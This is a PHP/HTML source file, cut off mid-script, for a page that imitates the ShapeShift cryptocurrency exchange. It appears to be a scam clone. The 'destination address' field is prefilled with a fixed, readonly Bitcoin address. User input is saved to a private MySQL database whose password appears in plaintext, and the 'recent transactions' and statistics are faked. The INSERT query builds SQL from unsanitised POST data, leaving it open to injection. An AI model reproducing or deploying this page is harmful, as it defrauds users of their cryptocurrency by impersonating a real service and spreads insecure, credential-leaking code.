<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html ng-app="ssYoApp" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="https://info.shapeshift.io/sites/default/files/fav_icon.png" type="image/png">
<title>ShapeShift | Cryptocurrency Exchange | Simple Coin Conversion</title>

<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="css/font-awesome.css">
<link rel="stylesheet" type="text/css" href="css/master.css">
<link rel="stylesheet" type="text/css" href="fonts/ex-font/fonts.min.css">

</head>
<?php

    $con = mysqli_connect("sql565.your-server.de","nnnnnnhs_1","hY5Y2QMbY2JJLpA22","nnnnnnhs_db1");

// Check connection
  if(mysqli_connect_errno())
  {
   
   echo "Failed to connect to MySQL: " . mysqli_connect_error();
  
  }
    
    $arrayvalues = array();
    $leftSymb = $rightSymb = $leftImg = $rightImg = $pairvalue = '';
	if($_POST){
		
		if(!empty($_POST['pairSave'])){
			
		   	 $bitcoinAddress = $_POST['bitcoinAddress'];
			 $refundAddress= $_POST['refundAddress'];
			 $termscondition = $_POST['termscondition'];
			 
			 $instant_rate= $_POST['instant_rate'];
			 $deposit_min= $_POST['deposit_min'];
			 $deposit_max= $_POST['deposit_max'];
			 $minner_fee= $_POST['minner_fee'];
			 $pair = $_POST['pair'];
			
			 
			 $query = "INSERT INTO bitcoindata (bitcoinaddress,refundaddress,termscondition,instant_rate,deposit_min,deposit_max,minner_fee,pair)
			 VALUES ('$bitcoinAddress ', '$refundAddress','$termscondition','$instant_rate','$deposit_min','$deposit_max','$minner_fee','$pair')";
			 if($con->query($query))
			 { ?>
			   <script>
				 alert("Transaction is successfull!");
			   </script>
			 <?php } 
					
		}else{
		$pairvalue = $_POST['pair'];

        $ValS = explode('_',$pairvalue);
		$leftSymb = strtoupper($ValS[0]);
		$rightSymb = strtoupper($ValS[1]);


		$url = 'https://shapeshift.io/marketinfo/'.$pairvalue;
        
		
		$curl = curl_init(); 
		// set url 
	    curl_setopt($curl, CURLOPT_URL,  $url); 
	    //return the transfer as a string 
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
		$resp = curl_exec($curl); 
		curl_close($curl);
		$arrayvalues = json_decode($resp);
		
        $url = 'https://shapeshift.io/getcoins/';
	// Get cURL resource 
	$curl = curl_init(); 
	// set url 
    curl_setopt($curl, CURLOPT_URL,  $url); 
    //return the transfer as a string 
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
	$resp = curl_exec($curl); 
	curl_close($curl);
	
	$arrayicons = json_decode($resp);
	
	
	foreach ($arrayicons as  $arrayicon) {
        
		if($arrayicon->symbol == $leftSymb){
			$leftImg = $arrayicon->image;
		}
		if($arrayicon->symbol == $rightSymb){
			$rightImg = $arrayicon->image;
		}	
			
		
			
		
	  }


	 }
		
	}else{
	$url = 'https://shapeshift.io/getcoins/';
	// Get cURL resource 
	$curl = curl_init(); 
	// set url 
    curl_setopt($curl, CURLOPT_URL,  $url); 
    //return the transfer as a string 
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
	$resp = curl_exec($curl); 
	curl_close($curl);
	
	$arrayicons = json_decode($resp);
	

	$left = $right = array();

    $leftArray = array('BTC', 'LTC', 'BCH', 'ETH');
	
	$k = array_rand($leftArray);
     $leftVal = $leftArray[$k];

	

	$rightArray = array_diff( $leftArray, array($leftVal));

	$k1 = array_rand($rightArray);

     $rightVal = $rightArray[$k1];

	$leftNewArray = $arrayicons->$leftVal;
	

    $left['name'] = $leftNewArray->name;
	$left['symbol'] = $leftNewArray->symbol;
	$left['image'] = $leftNewArray->image;
	$left['imageSmall'] = $leftNewArray->imageSmall;
	$left['status'] = $leftNewArray->status;
	$left['minerFee'] = $leftNewArray->minerFee;

	$leftSymb = $leftNewArray->symbol;
	$leftImg = $leftNewArray->image;


    $rightNewArray = $arrayicons->$rightVal;

    $right['name'] = $rightNewArray->name;
	$right['symbol'] = $rightNewArray->symbol;
	$right['image'] = $rightNewArray->image;
	$right['imageSmall'] = $rightNewArray->imageSmall;
	$right['status'] = $rightNewArray->status;
	$right['minerFee'] = $rightNewArray->minerFee;

	$rightSymb = $rightNewArray->symbol;
	$rightImg = $rightNewArray->image;

	$leftsymbol = strtolower($left['symbol']);
	$rightsymbol = strtolower($right['symbol']);
	$pairvalue = $leftsymbol.'_'.$rightsymbol;
	$url1 = 'https://shapeshift.io/marketinfo/'.$pairvalue;
	
		$curl = curl_init(); 
		// set url 
	    curl_setopt($curl, CURLOPT_URL,  $url1); 
	    //return the transfer as a string 
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
		$resp = curl_exec($curl); 
		curl_close($curl);
		$arrayvalues = json_decode($resp);
		
	}
	
	
	?>
<body class="home_page">
<article class="slider-arti">	
	<header id="main_header_id">
		<div class="header-main">
			<div class="top-header">
				<div class="container">
					<div class="row">
						<div class="col-sm-12 text-right">
							<ul class="social-icons">
								<li><a href="#"><i class="fa fa-twitter"></i></a></li>
								<li><a href="#"><i class="fa fa-facebook-official"></i></a></li>
								<li><a href="#"><i class="fa fa-slack"></i></a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
			<nav class="navbar navbar-default menu-header" id="nav-top">
				<div class="container">
					<div class="navbar-header">
						<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<a class="navbar-brand" href="index.html"><img src="images/logo.png"></a>
					</div>					
					<div class="collapse navbar-collapse navbar-right" id="bs-example-navbar-collapse-1">
						<ul class="nav navbar-nav main-nav">
							<li><a href="https://info.shapeshift.io/about">About</a></li>
							<li>
								<a class="dropdown-toggle" data-toggle="dropdown" href="/api" aria-expanded="false">API + Tools <span class="caret"></span>
								</a>
								<ul class="dropdown-menu">
									<li>
										<a href="https://info.shapeshift.io/api">API</a>
									</li>
									<li>
										<a href="https://info.shapeshift.io/tools/shapeshift-lens">Lens Extension</a>
									</li>
									<li>
										<a href="https://info.shapeshift.io/tools/shapeshift-mobile">Shifty Button</a>
									</li>
									<li>
										<a href="https://info.shapeshift.io/tools/skeleton">Skeleton</a>
									</li>
									<li>
										<a href="https://info.shapeshift.io/tools/shapeshift-mobile">ShapeShift for Mobile</a>
									</li>
									<li><a href="https://info.shapeshift.io/bitcoin-miner-fee">Recommended BTC Miner Fee</a>
									</li>
								</ul>
							</li>
							<li>
								<a class="dropdown-toggle" data-toggle="dropdown" href="#">Resources <span class="caret"></span></a>
								<ul class="dropdown-menu">
									<li><a href="https://info.shapeshift.io/contact">Company Information</a></li>
									<li><a href="https://info.shapeshift.io/for-business">For Business</a></li>
									<li><a href="https://shapeshift.io/legacy/affiliate.html">Affiliates</a></li>
									<li><a href="https://info.shapeshift.io/press">Press</a></li>
									<li><a href="https://info.shapeshift.io/testimonials">Testimonials</a></li>
									<li><a href="https://info.shapeshift.io/blog">Blog</a></li>
									<li><a href="https://info.shapeshift.io/videos">Videos</a></li>
									<li><a href="https://info.shapeshift.io/coincapio-web-and-mobile">CoinCap.io for Web and Mobile</a></li>
									<li><a href="https://store.bitcoin.com/?aff=243">Buy ShapeShift Merchandise</a></li>
								</ul>
							</li>
							<li>
								<a class="dropdown-toggle" data-toggle="dropdown" href="#">Support <span class="caret"></span></a>
								<ul class="dropdown-menu">
									<li><a href="https://shapeshift.zendesk.com/hc/en-us/requests/new" class="ng-binding">Contact Us</a></li>
									<li><a href="https://shapeshift.zendesk.com/hc/en-us">FAQ</a></li>
									<li><a href="https://info.shapeshift.io/sites/default/files/ShapeShift_Terms_Conditions%20v1.1.pdf" target="_blank">Terms and Conditions</a></li>
								</ul>
							</li>
							<li>
								<a href="https://info.shapeshift.io/coincapio-web-and-mobile"><img src="images/coincap-logo.png"></a>
							</li>
							<li>
								<a href="#" data-toggle="dropdown"><span class="flag-icon flag-icon-gb"></span> English <span class="caret"></span></a>
								<ul class="dropdown-menu">
									<li>
										<a href="https://de.shapeshift.io/#/coins"><span class="flag-icon flag-icon-de"></span> Deutsch</a>
									</li>
									<li>
										<a href="https://shapeshift.io/#/coins"><span class="flag-icon flag-icon-gb"></span> English</a>
									</li>
									<li>
										<a href="https://es.shapeshift.io/#/coins"><span class="flag-icon flag-icon-es"></span> Español</a>
									</li>
									<li>
										<a href="https://fr.shapeshift.io/#/coins"><span class="flag-icon flag-icon-fr"></span> Français</a>
									</li>
									<li>
										<a href="https://in.shapeshift.io/#/coins"><span class="flag-icon flag-icon-in"></span> हिंदी</a>
									</li>
									<li>
										<a href="https://it.shapeshift.io/#/coins"><span class="flag-icon flag-icon-it"></span> Italiano</a>
									</li>
									<li>
										<a href="https://jp.shapeshift.io/#/coins"><span class="flag-icon flag-icon-jp"></span> 日本の</a>
									</li>
									<li>
										<a href="https://ko.shapeshift.io/#/coins"><span class="flag-icon flag-icon-kr"></span> 한국어</a>
									</li>
									<li>
										<a href="https://pl.shapeshift.io/#/coins"><span class="flag-icon flag-icon-pl"></span> Polski</a>
									</li>
									<li>
										<a href="https://pt.shapeshift.io/#/coins"><span class="flag-icon flag-icon-pt"></span> Português</a>
									</li>
									<li>
										<a href="https://ru.shapeshift.io/#/coins"><span class="flag-icon flag-icon-ru"></span> русский</a>
									</li>
									<li>
										<a href="https://sa.shapeshift.io/#/coins"><span class="flag-icon flag-icon-sa"></span> العربية</a>
									</li>
									<li>
										<a href="https://ua.shapeshift.io/#/coins"><span class="flag-icon flag-icon-ua"></span> український</a>
									</li>
									<li>
										<a href="https://zh.shapeshift.io/"><span class="flag-icon flag-icon-cn"></span> 简体中文</a>
									</li>
								</ul>
							</li>
						</ul>
					</div>
				</div>
			</nav>
		</div>
	</header>
	
	<div class="inner-form">
		<div class="container">
			<div class="row">
				<div class="col-sm-12 text-center">
					<form id="signup-form" action="" method="post">
						<div class="form-heading clearfix">
							<div class="row">
								<div class="coin-data clearfix secondary">
									<div class="col-md-12 col-sm-12 rate">
										<img src="/images/loader.750afff3.svg" class="loader hide">
										<a href="index.html" class="back-btn">
											<span class="glyphicon glyphicon-chevron-left"></span>
										</a>
										<span>
											<label class="inline" style="color: rgba(255,255,255,.5);">Instant Rate</label> 1 <span class="topRate"><?php echo $leftSymb; ?> = <?php echo $arrayvalues->rate; ?>&nbsp;<?php echo 
											$rightSymb; ?></span>
										</span>
									</div>
									<div class="col-md-4 col-sm-4 head-se-form">
										<label>Deposit Min</label>
										<span class="MinVal"><?php echo $arrayvalues->minimum; ?>&nbsp;<?php echo $leftSymb; ?></span>
									</div>
									<div class="col-md-4 col-sm-4 head-se-form">
										<label>Deposit Max</label>
										<span class="MaxVal"><?php echo $arrayvalues->maxLimit; ?>&nbsp;<?php echo $leftSymb; ?></span>
									</div>
									<div class="col-md-4 col-sm-4 head-se-form">
										<label>Minner Fee</label>
										<span class="MinnerVal"><?php echo $arrayvalues->minerFee; ?>&nbsp;<?php echo $rightSymb; ?></span>
									</div>									
								</div>
							</div>
						</div>

						<div class="form-container">
							<div id="form-views" class="coin-pair text-center">
								<div class="switer-div">
									<span class="switch-right">
										<button type="button">
											<span data-toggle="modal" data-target="#squarespaceModal"><img src="<?php echo $leftImg; ?>"></span>
										</button>
									</span>

									<span class="my-btn-switch fa fa-arrow-right"></span>
									
									<span class="switch-right-right">
										<button type="button">
											<span data-toggle="modal" data-target="#squarespaceModal1"><img src="<?php echo $rightImg; ?>"></span>
										</button>
									</span>
								</div>

								

								<div class="fields clearfix row">								
									<div class="form-item col-md-12 form-group">
										<input type="text" name="bitcoinAddress" class="form-control" value="1NMN22XKBBvHFHNIUECZClwICc1FavuPf" placeholder="Your Bitcoin Address (destination address)" readonly>
									</div>
									
									<div class="col-md-12 form-item form-group">
										<input type="text" name="refundAddress" class="form-control" placeholder="Your Ether Refund Address" required>
									</div>
									
									<div class="checkbox col-md-12 form-item bottom-form clearfix form-group">
										<div class="row">
											<div class="col-md-7 col-sm-7 clearfix text-left">
												<label class="pull-left">
													<input type="checkbox" name="termscondition" required>I agree to the
													<a href="#" target="_blank">Terms
													</a>
													and certify that I am the beneficial owner of the input assets and the destination address.
												</label>
											</div>
											<div class="col-md-5 col-sm-5">
												Reusable Address?
												<label class="switch">
												  <input type="checkbox">
												  <span class="slider round"></span>
												</label>
											</div>
										</div>
									</div>

									
									<div class="col-md-12">
										<input type="hidden" name="pair" value="<?php echo $pairvalue; ?>" id="currPair" />
										<input type="hidden" name="instant_rate" value="<?php echo $arrayvalues->rate; ?>" id="instant_rate" />
										<input type="hidden" name="deposit_min" value="<?php echo $arrayvalues->minimum; ?>" id="deposit_min" />
										<input type="hidden" name="deposit_max" value="<?php echo $arrayvalues->maxLimit; ?>" id="deposit_max" />
										<input type="hidden" name="minner_fee" value="<?php echo $arrayvalues->minerFee; ?>" id="minner_fee" />
									
										<input type="hidden" name="pairSave" value="1" id="pairSave" />
										<input type="submit" name="submitsx" value="Start Transaction" class="submit-form">
										
									</div>
								</div>
							</div>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
</article>

<section>
	<div class="featured-block">
		<div class="container">
			<div class="row">
				<div class="col-md-4 content-block">
					<div class="row">
						<div class="col-md-4 icon-block">
							<img src="images/easy.png">
						</div>
						<div class="col-md-8">
							<h4>EASY</h4>
							<p>Choose the altcoins or blockchain tokens you would like to exchange, input your receiving address, &amp; send your funds. Fast crypto market exchanges, no fees, and a delightful process.</p>
						</div>
					</div>
				</div>
				<div class="col-md-4 content-block">
					<div class="row">
						<div class="col-md-4 icon-block">
							<img src="images/safe.png">
						</div>
						<div class="col-md-8">
							<h4>SAFE</h4>
							<p>Unlike other digital asset and bitcoin exchanges, you don’t need an account to use ShapeShift. This means your funds and information don’t suffer custodial risk.</p>
						</div>
					</div>
				</div>
				<div class="col-md-4 content-block">
					<div class="row">
						<div class="col-md-4 icon-block">
							<img src="images/competitive.png">
						</div>
						<div class="col-md-8">
							<h4>COMPETITIVE</h4>
							<p>We offer competitive altcoin and btc exchange rates that update in real time, with no fees on top. Our liquidity and expertise in cryptocurrency trading continually improve.</p>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</section>


<section>
	<div class="container recent-tx">
		<h3 class="grey-band" style="text-align: center">Recent Transactions</h3>
		<div class="row">
			<div class="col-md-4 tx-list">
				<h4 style="text-align: center">BTC <span class="fa fa-arrow-right"></span> ALT</h4>
				<div class="row">
					<div class="col-md-12 tx-row animate">
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/LTC">
									<img class="smallicon" src="images/litecoin.png">
								</a>
								<span class="notranslate">0.019</span>
								<a target="_blank" href="#" >BTC</a>
									to
								<a href="#" >LTC </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521444300484" >7 mins ago</time-ago>
							</p>
						</div>
					</div>

					<div class="col-md-12 tx-row">
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="#">
									<img class="smallicon" src="images/ether.png">
								</a>
								<span class="notranslate">0.001</span>
								<a target="_blank" href="#" >BTC</a> to <a href="#" >ETH </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521444229320">8 mins ago</time-ago>
							</p>
						</div>
					</div>

					<div class="col-md-12 tx-row animate " >
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/BCH">
									<img class="smallicon" src="images/bitcoincash.png">
								</a>
								<span class="notranslate">0.5</span>
								<a target="_blank" href="#" >BTC</a> to <a href="#" >BCH </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521443952062" >13 mins ago</time-ago>
							</p>
						</div>
					</div>

					<div class="col-md-12 tx-row animate ">
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/XMR">
									<img class="smallicon" src="images/monero.png">
								</a>
								<span class="notranslate">0.057</span>
								<a target="_blank" href="#" >BTC</a> to <a href="http://coincap.io/#/coin/XMR" >XMR </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521443782503" >15 mins ago</time-ago>
							</p>
						</div>
					</div>
				</div>
			</div>

			<div class="col-md-4 tx-list">
				<h4 style="text-align: center">ALT <span class="fa fa-arrow-right"></span> BTC</h4>
				<div class="row">
					<div class="col-md-12 tx-row animate " >
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="http://coincap.io/#/coin/XMR">
									<img class="smallicon" src="images/monero.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="notranslate">0.764</span>
								<a target="_blank" href="#" >XMR</a> to <a href="#" >BTC </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521444372700" >6 mins ago</time-ago>
							</p>
						</div>
					</div>
					
					<div class="col-md-12 tx-row animate " >
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="#">
									<img class="smallicon" src="images/ether.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="notranslate">0.225</span>
								<a target="_blank" href="#" >ETH</a> to <a href="#" >BTC </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521444330479" >6 mins ago</time-ago>
							</p>
						</div>
					</div>
					<div class="col-md-12 tx-row animate " >
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="http://coincap.io/#/coin/DASH">
									<img class="smallicon" src="images/dash.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
								</a>
								<span class="notranslate">1.801</span>
								<a target="_blank" href="http://coincap.io/#/coin/DASH" >DASH</a> to <a href="#" >BTC </a>
							</span>
							<p class="pull-right">
								<time-ago from-time="1521444310240" >7 mins ago</time-ago>
							</p>
						</div>
					</div>
					<div class="col-md-12 tx-row animate " >
						<div class="tx-block">
							<span class="tx-info pull-left">
								<a target="_blank" href="#">
									<img class="smallicon" src="images/ether.png">
								</a>
								<span class="fa fa-arrow-right"></span>
								<a target="_blank" href="http://coincap.io/#/coin/BTC">
									<img class="smallicon" src="images/bitcoin.png">
									</a> <span class="notranslate">0.078</span>
									<a target="_blank" href="#" >ETH</a> to <a href="#" >BTC </a>
								</span>
								<p class="pull-right">
									<time-ago from-time="1521444226234" >8 mins ago</time-ago>
								</p>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-4 tx-list">
					<h4 style="text-align: center">ALT <span class="fa fa-arrow-right"></span> ALT</h4>
					<div class="row">
						<div class="col-md-12 tx-row animate " >
							<div class="tx-block">
								<span class="tx-info pull-left">
									<a target="_blank" href="http://coincap.io/#/coin/ETH">
										<img class="smallicon" src="images/ether.png">
									</a>
									<span class="fa fa-arrow-right">
										
									</span>
									<a target="_blank" href="http://coincap.io/#/coin/BCH">
										<img class="smallicon" src="images/bitcoincash.png">
									</a>
									<span class="notranslate">1.380</span>
									<a target="_blank" href="#" >ETH</a> to <a href="#" >BCH </a>
								</span>
								<p class="pull-right">
									<time-ago from-time="1521444603149" >2 mins ago</time-ago>
								</p>
							</div>
						</div>
						<div class="col-md-12 tx-row animate " >
							<div class="tx-block">
								<span class="tx-info pull-left">
									<a target="_blank" href="http://coincap.io/#/coin/ETH">
										<img class="smallicon" src="images/ether.png">
									</a>
									<span class="fa fa-arrow-right"></span>
									<a target="_blank" href="http://coincap.io/#/coin/BCH">
										<img class="smallicon" src="images/bitcoincash.png">
									</a>
									<span class="notranslate">1.377</span>
									<a target="_blank" href="#" >ETH</a> to <a href="#" >BCH </a>
								</span>
								<p class="pull-right">
									<time-ago from-time="1521444539718" >3 mins ago</time-ago>
								</p>
							</div>
						</div>

						<div class="col-md-12 tx-row animate " >
							<div class="tx-block">
								<span class="tx-info pull-left">
									<a target="_blank" href="http://coincap.io/#/coin/XMR">
										<img class="smallicon" src="images/monero.png">
									</a>
									<span class="fa fa-arrow-right"></span>
									<a target="_blank" href="http://coincap.io/#/coin/ETH">
										<img class="smallicon" src="images/ether.png">
									</a>
									<span class="notranslate">2.412</span>
									<a target="_blank" href="#" >XMR</a> to <a href="#" >ETH </a>
								</span>
								<p class="pull-right">
									<time-ago from-time="1521444519142" >3 mins ago</time-ago>
								</p>
							</div>
						</div>

						<div class="col-md-12 tx-row animate " >
							<div class="tx-block">
								<span class="tx-info pull-left">
									<a target="_blank" href="http://coincap.io/#/coin/ETH">
										<img class="smallicon" src="images/ether.png">
									</a>
									<span class="fa fa-arrow-right"></span>
									<a target="_blank" href="http://coincap.io/#/coin/XMR">
										<img class="smallicon" src="images/monero.png">
									</a>
									<span class="notranslate">0.222</span>
									<a target="_blank" href="#" >ETH</a> to <a href="#" >XMR </a>
								</span>
								<p class="pull-right">
									<time-ago from-time="1521444498774">3 mins ago</time-ago>
								</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
</section>

<section>
	<div class="stats " ng-controller="stats">
		<div class="container">
			<h3 style="text-align: center" class="divider grey-band">24 Hour Statistics</h3>
			<div class="row">
				<div class="col-md-3 chart">
					<div class="chart-container">
						<div id="container" style="min-width: 180px; height: 180px; max-width: 180px; margin: 0 auto"></div>
					</div>
					<strong >By Order Quantity</strong>
				</div>
				<div class="col-md-6 raw-data">
					<div class="row">
						<div class="col-md-6">
							<div class="panel panel-default">
								<div class="panel-heading">Transactions</div>
								<div class="panel-body">
									<p class="large">10,518</p>
								</div>
							</div>
						</div>
						<div class="col-md-6">
							<div class="panel panel-default">
								<div class="panel-heading">Bitcoin Volume Equivalent</div>
								<div class="panel-body">
									<p class="large">1,024.566 BTC</p>
								</div>
							</div>
						</div>
					</div>
					<div class="row">
						<div class="col-md-6">
							<div class="panel panel-default">
								<div class="panel-heading">Average Processing Time</div>
								<div class="panel-body">
									<p class="large">435 seconds</p>
								</div>
							</div>
						</div>
						<div class="col-md-6">
							<div class="panel panel-default">
								<div class="panel-heading">Most Popular Trade</div>
								<div class="panel-body">
									<p class="large">
										<a target="_blank" href="http://coincap.io/#/coin/BTC">
											<img class="smallicon" src="images/bitcoin.png">
										</a>
										<span class="fa fa-arrow-right"></span>
										<a target="_blank" href="http://coincap.io/#/coin/ETH">
											<img class="smallicon" src="images/ether.png">
										</a>
									</p>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-3 chart">
					<div class="chart-container">
						<div id="container2" style="min-width: 180px; height: 180px; max-width: 180px; margin: 0 auto"></div>
					</div>
					<strong >By Value</strong>
				</div>
			</div>
		</div>
	</div>
</section>

<div class="newsletter clearfix" style="padding:15px">
	<div class="col-md-6 col-md-offset-3">
		<div id="mc_embed_signup">
  			<form id="mc-embedded-subscribe-form" class="validate">
  				<div id="mc_embed_signup_scroll">
  					<div class="input-group">
  						<input type="email" value="" class="form-control" placeholder="Enter Email to Receive Updates About ShapeShift">
  						<div id="mce-responses" class="clear">
  							<div class="response" id="mce-error-response" style="display:none">
  							</div>
  							<div class="response" id="mce-success-response" style="display:none">
  							</div>
  						</div>
  						<div style="position: absolute; left: -5000px">
  							<input type="text" name="" tabindex="-1" value="">
  						</div>
  						<span class="input-group-btn">
  							<input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="btn btn-success">
  						</span>
  					</div>
  				</div>
  			</form>
  		</div>
  	</div>
</div>

<footer class="clearfix">
	<div class="container">
		<div class="col-md-3">
			<img width="150" src="images/logo.png"> <p style="margin-top:15px">
				<a href="https://shapeshift.io/">© ShapeShift 2018</a>
			</p>
			<p>
				<a href="#" style="margin-bottom: 6px;">
					<img style="width:135px !important" src="images/appstore-lrg.f8bae167.png">
				</a>
				<a href="#" target="_blank">
					<img style="width:135px !important" src="images/android_badge.png">
				</a>
				<a href="#" target="_blank">
					<img style="width:135px;margin-top:10px" src="images/BitGo_Instant_accepted_here_white.png">
				</a>
			</p>
		</div>
		<div class="col-md-3">
			<h4>API + Tools</h4>
			<ul class="list-unstyled">
				<li><a href="https://info.shapeshift.io/api" class="ng-binding">API</a></li>
				<li><a href="https://info.shapeshift.io/tools/lens" class="ng-binding">Lens Extension</a></li>
				<li class="active"><a href="https://info.shapeshift.io/tools/shifty-button" class="ng-binding">Shifty Button</a></li>
			</ul>
		</div>
		<div class="col-md-3">
			<h4>Resources</h4>

			<ul class="list-unstyled">
				<li><a href="https://info.shapeshift.io/contact" class="ng-binding">Company Information</a></li>
				<li><a href="https://info.shapeshift.io/for-business" class="ng-binding">For Business</a></li>
				<li><a href="https://shapeshift.io/legacy/affiliate.html" class="ng-binding">Affiliates</a></li>
				<li><a href="https://info.shapeshift.io/press" class="ng-binding">Press</a></li>
				<li><a href="https://info.shapeshift.io/testimonials" class="ng-binding">Testimonials</a></li>
				<li><a href="https://info.shapeshift.io/blog" class="ng-binding">Blog</a></li>
				<li><a href="https://info.shapeshift.io/videos" class="ng-binding">Videos</a></li>
			</ul>
		</div>
		<div class="col-md-3">
			<h4>Support</h4>
			<ul class="list-unstyled">
				<li><a href="https://shapeshift.zendesk.com/hc/en-us/requests/new" class="ng-binding">Contact Us</a></li>
				<li><a href="https://shapeshift.zendesk.com/hc/en-us" class="ng-binding">FAQ</a></li>
				<li><a href="https://info.shapeshift.io/sites/default/files/ShapeShift_Terms_Conditions%20v1.1.pdf" target="_blank" class="ng-binding">Terms and Conditions</a></li>
			</ul>		
		</div>
	</div>
</footer>
<div class="modal fade coin-modal" id="squarespaceModal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
  	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<input type="text" placeholder="Search by asset name or symbol">
                <button type="button" class="close" data-dismiss="modal">
                	<span aria-hidden="true">×</span>
                	<span class="sr-only">Close</span>
                </button>
			</div>
			<div class="modal-body">
				<?php
					foreach ($arrayicons as $arrayicon) { 
						if($arrayicon->symbol == 'BTC' || $arrayicon->symbol == 'LTC' || $arrayicon->symbol == 'BCH' || $arrayicon->symbol == 'ETH' ){ ?>
						<div class="col-md-3 col-sm-4 animation coin-outer">
		            		<div class="coin-image"> 
		                		<img src="<?php echo  $arrayicon->image; ?>"  onclick="get_icon_data(this,'<?php echo  strtolower($arrayicon->symbol); ?>','<?php echo  $arrayicon->imageSmall; ?>')">
		                		<strong class="coin-name ng-binding"><?php echo  $arrayicon->name; ?></strong>
		            		</div>
            			</div>
					<?php } 
				}
				?>
			</div>
		</div>
  	</div>
</div>


<div class="modal fade coin-modal" id="squarespaceModal1" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
  	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<input type="text" placeholder="Search by asset name or symbol">
                <button type="button" class="close" data-dismiss="modal">
                	<span aria-hidden="true">×</span>
                	<span class="sr-only">Close</span>
                </button>
			</div>
			<div class="modal-body">
				<?php
					foreach ($arrayicons as $arrayicon) { 
						if($arrayicon->symbol == 'BTC' || $arrayicon->symbol == 'LTC' || $arrayicon->symbol == 'BCH' || $arrayicon->symbol == 'ETH' ){ ?>
						<div class="col-md-3 col-sm-4 animation coin-outer">
		            		<div class="coin-image"> 
		                		<img src="<?php echo  $arrayicon->image; ?>"  onclick="get_icon_data1(this,'<?php echo  strtolower($arrayicon->symbol); ?>','<?php echo  $arrayicon->imageSmall; ?>')">
		                		<strong class="coin-name ng-binding"><?php echo  $arrayicon->name; ?></strong>
		            		</div>
            			</div>
					<?php } 
				}
				?>
			</div>
		</div>
  	</div>
</div>
<div style="" class="loader"><img src="images/loading-spin.b9420342.svg"></div>



<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script src="js/highcharts.js"></script>

<script type="text/javascript">
function get_icon_data(obj,iconname)
	{
		var iconsrc=$(obj).attr('src');
		//alert(iconsrc);
		var outputsrc=$('.switch-right-right img').attr('src');
		var data=$('#currPair').val();
		var arr = data.split('_');
		var firstdata= iconname+'_'+arr[1];
		if(outputsrc!=iconsrc)
		{
		 $('.switch-right img').attr('src',iconsrc);
		 $('#currPair').val(firstdata);
		 
		 ajaxTimer(firstdata);
		 $('.close').trigger('click');
		
		}
		else
		{
			alert('Error:You have selected same icons.');
		}
		
		
		
		
		
	}
	function get_icon_data1(obj,iconname1)
	{
		var iconsrc1=$(obj).attr('src');
		//alert(iconsrc);
		
		var inputiconimg=$('.switch-right img').attr('src');
		var data=$('#currPair').val();
		var arr = data.split('_');
		var lastdata=arr[0]+'_'+iconname1;
		
		if(inputiconimg!=iconsrc1)
		{
		$('.switch-right-right img').attr('src',iconsrc1);
		
		$('#currPair').val(lastdata);
		ajaxTimer(lastdata);
		$('.close').trigger('click');
		
		}
		else
		{
